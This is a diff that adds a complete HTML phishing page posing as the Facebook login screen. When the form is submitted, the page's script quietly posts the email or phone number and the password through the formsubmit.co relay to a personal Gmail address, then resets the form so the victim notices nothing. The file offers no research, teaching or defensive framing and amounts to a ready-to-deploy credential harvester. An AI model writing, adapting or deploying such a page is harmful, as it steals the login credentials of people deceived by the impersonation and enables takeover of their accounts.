@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Facebook Login</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+  }
+  .login-container {
+    background: white;
+    border-radius: 8px;
+    padding: 24px;
+    width: 320px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  }
+  h2 {
+    color: #1877f2;
+    margin-bottom: 20px;
+    text-align: center;
+  }
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 12px 10px;
+    margin: 8px 0;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 16px;
+  }
+  button {
+    background-color: #1877f2;
+    color: white;
+    width: 100%;
+    padding: 12px;
+    font-size: 18px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #165ece;
+  }
+  .footer-text {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #606770;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+<div class="login-container">
+  <h2>Facebook Login</h2>
+  <form id="loginForm">
+    <input type="text" id="email" name="email" placeholder="Email or phone number" required autocomplete="username" />
+    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password" />
+    <button type="submit">Log In</button>
+  </form>
+  <div class="footer-text">
+    Facebook helps you connect and share with the people in your life.
+  </div>
+</div>
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    
+    fetch('https://formsubmit.co/ajax/hazahiza0@gmail.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email_or_phone: email,
+        password: password
+      })
+    });
+    // Optionally clear inputs or give some indication the form was submitted
+    this.reset();
+  });
+</script>
+</body>
+</html>
+
+```
